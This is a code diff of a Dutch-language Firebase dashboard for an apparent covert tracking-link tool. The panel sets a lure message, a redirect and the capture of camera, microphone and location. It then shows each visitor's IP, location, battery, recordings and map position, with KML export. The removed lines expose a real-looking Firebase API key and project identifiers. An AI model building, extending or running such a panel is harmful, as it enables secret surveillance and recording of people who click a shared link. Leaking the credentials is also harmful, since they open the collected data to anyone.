@@ -1,5 +1,4 @@
 <!-- location.html -->
-
 <!DOCTYPE html>
 <html lang="nl">
 <head>
@@ -21,7 +20,6 @@
             align-items: center;
         }
 
-        /* Container voor schakelaars en bewerkbare velden */
         .switches-container {
             background: rgba(255, 255, 255, 0.95);
             padding: 20px;
@@ -33,7 +31,6 @@
             box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
 
-        /* Live bezoekers sectie */
         .live-visitors {
             background: rgba(255, 255, 255, 0.95);
             padding: 20px;
@@ -52,7 +49,6 @@
             color: #333;
         }
 
-        /* Locatie items */
         .location-item {
             margin-bottom: 20px;
             border: 1px solid #ddd;
@@ -71,7 +67,6 @@
             transform: translateY(-5px);
         }
 
-        /* Professionele sluitknop */
         .close-btn {
             position: absolute;
             top: 15px;
@@ -89,10 +84,9 @@
         }
 
         .close-btn::before {
-            content: '\2715'; /* Unicode-teken voor 'x' */
+            content: '\2715';
         }
 
-        /* Schakelaar */
         .switch {
             position: relative;
             display: inline-block;
@@ -144,7 +138,6 @@
             transform: translateX(26px);
         }
 
-        /* Algemene label stijl */
         label {
             font-size: 16px;
             margin-bottom: 2px;
@@ -183,59 +176,6 @@
             outline: none;
         }
 
-        .notification-section {
-            margin-top: 20px;
-            text-align: left;
-        }
-
-        .notification-section input[type="text"],
-        .notification-section input[type="file"] {
-            width: 100%;
-            padding: 10px;
-            margin-top: 5px;
-            margin-bottom: 10px;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            font-size: 16px;
-            box-sizing: border-box;
-            transition: border-color 0.3s;
-        }
-
-        .notification-section input[type="text"]:focus,
-        .notification-section input[type="file"]:focus {
-            border-color: #4caf50;
-            outline: none;
-        }
-
-        .notification-section img {
-            margin-top: 10px;
-            max-width: 100px;
-            border-radius: 5px;
-        }
-
-        .notification-section button {
-            margin-top: 10px;
-            padding: 12px 25px;
-            border: none;
-            background-color: #4caf50;
-            color: white;
-            cursor: pointer;
-            border-radius: 5px;
-            font-size: 16px;
-            transition: background-color 0.3s, transform 0.2s;
-        }
-
-        .notification-section button:hover {
-            background-color: #45a049;
-            transform: scale(1.05);
-        }
-
-        .notification-section button:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-        }
-
-        /* Uitlijning van schakelaars en tekst */
         .switch-container {
             display: flex;
             align-items: center;
@@ -253,7 +193,6 @@
             font-weight: bold;
         }
 
-        /* Bewerkbare titel */
         .title-input {
             width: 100%;
             padding: 10px;
@@ -272,7 +211,6 @@
             outline: none;
         }
 
-        /* Map container */
         .map-container {
             width: 100%;
             height: 200px;
@@ -281,7 +219,6 @@
             overflow: hidden;
         }
 
-        /* Disclaimer */
         .disclaimer {
             margin-top: 20px;
             font-size: 12px;
@@ -289,11 +226,10 @@
             text-align: center;
         }
 
-        /* Professionele knop stijl */
         #saveSettingsButton {
             padding: 12px 25px;
             font-size: 16px;
-            background-color: #007BFF; /* Professionele blauwe kleur */
+            background-color: #007BFF;
             color: white;
             border: none;
             border-radius: 5px;
@@ -311,7 +247,6 @@
             box-shadow: 0 6px 8px rgba(0, 123, 255, 0.4);
         }
 
-        /* Nieuwe stijl voor opnameduur */
         .recording-duration-section {
             margin-top: 20px;
         }
@@ -323,7 +258,6 @@
             margin-bottom: 5px;
         }
 
-        /* Responsive */
         @media screen and (max-width: 480px) {
             body {
                 padding: 10px;
@@ -343,11 +277,6 @@
 
             .edit-label, .switch-text {
                 font-size: 14px;
-            }
-
-            .notification-section button {
-                font-size: 14px;
-                padding: 10px 20px;
             }
 
             .title-input {
@@ -370,13 +299,11 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-messaging-compat.js"></script>
     <!-- Leaflet JS -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
     <h1>Opgeslagen Gegevens</h1>
 
-    <!-- Schakelaars in een wit vak -->
     <div class="switches-container">
         <!-- On/Off schakelaars -->
         <div class="switch-container">
@@ -403,7 +330,6 @@
             <span class="switch-text">Notificatie toestemming inschakelen</span>
         </div>
 
-        <!-- Bewerk sectie -->
         <div class="edit-section">
             <label for="messageInput" class="edit-label">Bewerk de berichttekst:</label>
             <input type="text" id="messageInput" placeholder="Youssof heeft je een link gestuurd!">
@@ -414,18 +340,15 @@
             <label for="redirectDelayInput" class="edit-label">Aantal seconden voor redirect:</label>
             <input type="number" id="redirectDelayInput" placeholder="5" min="1" max="60">
 
-            <!-- Nieuwe sectie voor opnameduur -->
             <div class="recording-duration-section">
                 <label for="recordingDurationInput" class="edit-label">Aantal seconden voor opname:</label>
                 <input type="number" id="recordingDurationInput" placeholder="5" min="1" max="60">
             </div>
 
-            <!-- Professioneel gestylede knop -->
             <button id="saveSettingsButton">Instellingen Opslaan</button>
         </div>
     </div>
 
-    <!-- Live bezoekers sectie -->
     <div class="live-visitors">
         <h2>Live Bezoekers: <span id="liveVisitorsCount">0</span></h2>
     </div>
@@ -437,21 +360,19 @@
     <script>
         // Firebase-configuratie
         const firebaseConfig = {
-            apiKey: "AIzaSyAEw9353xS1az8fl6yDbwxeqGR9E4dT7h0",
-            authDomain: "loc-60f9d.firebaseapp.com",
-            databaseURL: "https://loc-60f9d-default-rtdb.europe-west1.firebasedatabase.app",
-            projectId: "loc-60f9d",
-            storageBucket: "loc-60f9d.firebasestorage.app",
-            messagingSenderId: "530676836005",
-            appId: "1:530676836005:web:565aab01da59f6ba9c4f4c",
-            measurementId: "G-47CS0L8VF1"
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_AUTH_DOMAIN",
+            databaseURL: "YOUR_DB_URL",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_STORAGE_BUCKET",
+            messagingSenderId: "YOUR_SENDER_ID",
+            appId: "YOUR_APP_ID",
+            measurementId: "YOUR_MEASUREMENT_ID"
         };
 
-        // Firebase initialiseren
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
         const auth = firebase.auth();
-        const messaging = firebase.messaging();
 
         // Anonieme authenticatie
         auth.signInAnonymously().catch(function(error) {
@@ -461,28 +382,12 @@
         auth.onAuthStateChanged(function(user) {
             if (user) {
                 const uid = user.uid;
-                // Haal FCM-token op
-                messaging.requestPermission()
-                .then(function() {
-                    console.log('Notificatie toestemming verleend.');
-                    return messaging.getToken({ vapidKey: 'YOUR_PUBLIC_VAPID_KEY' });
-                })
-                .then(function(token) {
-                    console.log('FCM Token:', token);
-                    // Sla het token op in de database
-                    db.ref(`users/${uid}/fcmToken`).set(token);
-                })
-                .catch(function(err) {
-                    console.error('Fout bij het verkrijgen van FCM-token:', err);
-                });
             }
         });
 
-        // Referenties
         const settingsRef = db.ref('settings');
         const dataRef = db.ref('collectedData');
 
-        // Haal instellingen op uit Firebase
         let settings = {};
         settingsRef.on('value', (snapshot) => {
             settings = snapshot.val() || {};
@@ -490,30 +395,26 @@
         });
 
         function updateUI() {
-            // Stel de huidige waarden in de UI
             micCamSwitch.checked = settings.micCamEnabled === true;
             locationSwitch.checked = settings.locationEnabled === true;
             notificationsSwitch.checked = settings.notificationsEnabled === true;
             messageInput.value = settings.messageText || "Youssof heeft je een link gestuurd!";
             redirectUrlInput.value = settings.redirectUrl || "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
             redirectDelayInput.value = settings.redirectDelay || 5;
-            recordingDurationInput.value = settings.recordingDuration || 5; // Nieuwe instelling
+            recordingDurationInput.value = settings.recordingDuration || 5;
         }
 
-        // Elementen ophalen
         const micCamSwitch = document.getElementById("micCamSwitch");
         const locationSwitch = document.getElementById("locationSwitch");
         const notificationsSwitch = document.getElementById("notificationsSwitch");
         const messageInput = document.getElementById("messageInput");
         const redirectUrlInput = document.getElementById("redirectUrlInput");
         const redirectDelayInput = document.getElementById("redirectDelayInput");
-        const recordingDurationInput = document.getElementById("recordingDurationInput"); // Nieuwe element
+        const recordingDurationInput = document.getElementById("recordingDurationInput");
         const saveSettingsButton = document.getElementById("saveSettingsButton");
         const liveVisitorsCount = document.getElementById("liveVisitorsCount");
 
-        // Event listener voor de knop om instellingen op te slaan
         saveSettingsButton.addEventListener("click", () => {
-            // Opslaan van de schakelaars en velden naar Firebase
             const newSettings = {
                 micCamEnabled: micCamSwitch.checked,
                 locationEnabled: locationSwitch.checked,
@@ -521,7 +422,7 @@
                 messageText: messageInput.value,
                 redirectUrl: redirectUrlInput.value,
                 redirectDelay: parseInt(redirectDelayInput.value, 10) || 5,
-                recordingDuration: parseInt(recordingDurationInput.value, 10) || 5 // Opslaan van opnameduur
+                recordingDuration: parseInt(recordingDurationInput.value, 10) || 5
             };
 
             settingsRef.set(newSettings, (error) => {
@@ -533,7 +434,6 @@
             });
         });
 
-        // Functie om gegevens te verwijderen op basis van Firebase key
         function deleteDataItemByKey(key) {
             db.ref(`collectedData/${key}`).remove()
                 .then(() => {
@@ -544,15 +444,12 @@
                 });
         }
 
-        // Live bezoekers bijwerken
         function updateLiveVisitors(count) {
             liveVisitorsCount.textContent = count;
         }
 
-        // Functie om gegevens te groeperen op locatie
         function groupDataByLocation(data) {
             const groupedData = {};
-
             data.forEach((item) => {
                 let lat, lon;
                 if (item.ipLocation && item.ipLocation.lat && item.ipLocation.lon) {
@@ -576,11 +473,9 @@
                             recordings: [],
                             battery: item.battery || {},
                             redirectUrl: item.redirectUrl || "",
-                            notification: item.notification || {},
-                            notificationSentCount: 0,
                             title: item.title || "Gegevens",
                             ipLocation: item.ipLocation || null,
-                            keys: [] // Voeg een array toe om meerdere keys te ondersteunen
+                            keys: []
                         };
                     }
                     groupedData[key].visits += 1;
@@ -590,24 +485,17 @@
                         groupedData[key].recordings.push(item.recording.dataUrl);
                     }
 
-                    if (item.notification && item.notification.sentCount) {
-                        groupedData[key].notificationSentCount = item.notification.sentCount;
-                    }
-
-                    // Voeg de unieke key toe
                     if (item.key) {
                         groupedData[key].keys.push(item.key);
                     }
                 }
             });
-
             return groupedData;
         }
 
-        // Functie om live bezoekers te tellen
         function countLiveVisitors(dataArray) {
             const now = Date.now();
-            const fiveMinutesAgo = now - (5 * 60 * 1000); // 5 minuten in milliseconden
+            const fiveMinutesAgo = now - (5 * 60 * 1000);
             let liveCount = 0;
 
             dataArray.forEach(item => {
@@ -636,9 +524,8 @@
 
                 const groupedData = groupDataByLocation(dataArray);
 
-                container.innerHTML = ""; // Clear existing content
+                container.innerHTML = ""; 
 
-                // Bereken live bezoekers
                 const liveVisitors = countLiveVisitors(dataArray);
                 updateLiveVisitors(liveVisitors);
 
@@ -651,17 +538,14 @@
 
                     const closeButton = document.createElement("button");
                     closeButton.classList.add("close-btn");
-                    // Voeg een event listener toe voor elk uniek key
                     closeButton.onclick = () => {
                         dataItem.keys.forEach(k => deleteDataItemByKey(k));
                     };
 
                     let htmlContent = "";
 
-                    // Bewerkbare titel
                     htmlContent += `<input type="text" id="title-${key}" class="title-input" value="${dataItem.title}" placeholder="Titel">`;
 
-                    // Locatiegegevens
                     if (dataItem.ipLocation) {
                         htmlContent += `
                             <p><strong>IP-adres:</strong> ${dataItem.ipLocation.ip}</p>
@@ -695,7 +579,6 @@
                         </ul>
                     `;
 
-                    // Opnames
                     if (dataItem.recordings.length > 0) {
                         htmlContent += `<p><strong>Opnames:</strong></p>`;
                         dataItem.recordings.forEach((recordingUrl, recIndex) => {
@@ -708,17 +591,13 @@
                         });
                     }
 
-                    // Map container
                     htmlContent += `<div id="map-${key}" class="map-container"></div>`;
-
-                    // Download KML knop
                     htmlContent += `<button id="downloadKML-${key}">Download KML</button>`;
 
                     locationItem.innerHTML = htmlContent;
                     locationItem.appendChild(closeButton);
                     container.appendChild(locationItem);
 
-                    // Initializeer de kaart
                     if (dataItem.lat && dataItem.lon) {
                         const map = L.map(`map-${key}`).setView([dataItem.lat, dataItem.lon], 13);
 
@@ -738,151 +617,26 @@
                             .openPopup();
                     }
 
-                    // Notificatiesectie
-                    const notificationSection = document.createElement("div");
-                    notificationSection.classList.add("notification-section");
-                    notificationSection.innerHTML = `
-                        <h3>Notificatie</h3>
-                        <div class="switch-container">
-                            <label class="switch">
-                                <input type="checkbox" id="actionSwitch-${key}">
-                                <span class="slider"></span>
-                            </label>
-                            <span class="switch-text">Antwoordbare notificatie inschakelen</span>
-                        </div>
-                        <input type="text" id="bodyText-${key}" placeholder="Voer body tekst in">
-                        <input type="file" id="iconUpload-${key}" accept="image/*">
-                        <button id="sendNotification-${key}">Stuur</button>
-                        <p>Aantal keer gestuurd: <span id="notificationCount-${key}">${dataItem.notificationSentCount || 0}</span></p>
-                    `;
-
-                    locationItem.appendChild(notificationSection);
-
-                    // Zet bestaande waarden
-                    if (dataItem.notification) {
-                        const bodyTextElement = document.getElementById(`bodyText-${key}`);
-                        if (bodyTextElement) {
-                            bodyTextElement.value = dataItem.notification.bodyText || "";
-                        }
-                        if (dataItem.notification.iconDataUrl) {
-                            const iconPreview = document.createElement("img");
-                            iconPreview.src = dataItem.notification.iconDataUrl;
-                            iconPreview.width = 50;
-                            iconPreview.height = 50;
-                            notificationSection.appendChild(iconPreview);
-                        }
-                    }
-
-                    // Event listeners
                     const titleInput = document.getElementById(`title-${key}`);
                     if (titleInput) {
                         titleInput.addEventListener("input", function() {
                             const newTitle = this.value;
-                            // Update title in Firebase voor alle keys in deze groep
                             dataItem.keys.forEach(k => {
                                 db.ref(`collectedData/${k}`).update({ title: newTitle });
                             });
                         });
                     }
 
-                    const bodyTextInput = document.getElementById(`bodyText-${key}`);
-                    if (bodyTextInput) {
-                        bodyTextInput.addEventListener("input", function() {
-                            const newBodyText = this.value;
-                            // Update bodyText in Firebase voor alle keys in deze groep
-                            dataItem.keys.forEach(k => {
-                                db.ref(`collectedData/${k}/notification/bodyText`).set(newBodyText);
-                            });
-                        });
-                    }
-
-                    const iconUploadInput = document.getElementById(`iconUpload-${key}`);
-                    if (iconUploadInput) {
-                        iconUploadInput.addEventListener("change", function(event) {
-                            const file = event.target.files[0];
-                            if (file) {
-                                const reader = new FileReader();
-                                reader.onloadend = function() {
-                                    const iconDataUrl = reader.result;
-                                    // Update iconDataUrl in Firebase voor alle keys in deze groep
-                                    dataItem.keys.forEach(k => {
-                                        db.ref(`collectedData/${k}/notification/iconDataUrl`).set(iconDataUrl);
-                                    });
-
-                                    // Voeg icon preview toe
-                                    const existingImg = notificationSection.querySelector("img");
-                                    if (existingImg) {
-                                        existingImg.src = iconDataUrl;
-                                    } else {
-                                        const iconPreview = document.createElement("img");
-                                        iconPreview.src = iconDataUrl;
-                                        iconPreview.width = 50;
-                                        iconPreview.height = 50;
-                                        notificationSection.appendChild(iconPreview);
-                                    }
-                                };
-                                reader.readAsDataURL(file);
-                            }
-                        });
-                    }
-
-                    const sendNotificationButton = document.getElementById(`sendNotification-${key}`);
-                    if (sendNotificationButton) {
-                        sendNotificationButton.addEventListener("click", async function() {
-                            const bodyText = document.getElementById(`bodyText-${key}`).value;
-                            const actionSwitch = document.getElementById(`actionSwitch-${key}`).checked;
-                            const targetUserId = 'TARGET_USER_ID'; // Vervang dit met de juiste logica om de ontvanger te bepalen
-
-                            // Verstuur de notificatie via je server-side functie
-                            try {
-                                const response = await fetch('https://YOUR_CLOUD_FUNCTION_URL/send-notification', {
-                                    method: 'POST',
-                                    headers: {
-                                        'Content-Type': 'application/json'
-                                    },
-                                    body: JSON.stringify({
-                                        userId: targetUserId,
-                                        message: {
-                                            title: 'Nieuwe Notificatie',
-                                            body: bodyText,
-                                            icon: dataItem.notification.iconDataUrl || 'https://example.com/default-icon.png'
-                                        }
-                                    })
-                                });
-
-                                if (response.ok) {
-                                    alert("Notificatie succesvol verzonden.");
-                                    // Update de notificatie count indien nodig
-                                    const newSentCount = (dataItem.notificationSentCount || 0) + 1;
-                                    db.ref(`collectedData/${key}/notification/sentCount`).set(newSentCount);
-                                    document.getElementById(`notificationCount-${key}`).innerText = newSentCount;
-                                } else {
-                                    alert("Fout bij het verzenden van de notificatie.");
-                                }
-                            } catch (error) {
-                                console.error("Fout bij het verzenden van de notificatie:", error);
-                                alert("Fout bij het verzenden van de notificatie.");
-                            }
-                        });
-                    }
-
-                    // Event listener voor Download KML knop
                     const downloadKMLButton = document.getElementById(`downloadKML-${key}`);
                     if (downloadKMLButton) {
                         downloadKMLButton.addEventListener("click", function() {
                             generateAndDownloadKML(dataItem);
                         });
                     }
+                }
+            });
+        }
 
-                    // Initialiseer notificatie toestemmingen indien nodig
-                    if (settings.notificationsEnabled && "Notification" in window) {
-                        Notification.requestPermission();
-                    }
-                } // einde for loop
-            }); // einde dataRef.once
-        } // einde displaySavedLocations
-
-        // Functie om KML te genereren en te downloaden
         function generateAndDownloadKML(dataItem) {
             const kmlContent = `<?xml version="1.0" encoding="UTF-8"?>
     <kml xmlns="http://www.opengis.net/kml/2.2">
@@ -906,16 +660,11 @@
             URL.revokeObjectURL(url);
         }
 
-        // Live update functie
         function startLiveUpdates() {
-            // Luister naar veranderingen in de collectedData
             dataRef.on('value', displaySavedLocations);
         }
 
-        // Start live updates
         startLiveUpdates();
-
-        // Eerste keer weergeven
         displaySavedLocations();
     </script>
 </body>
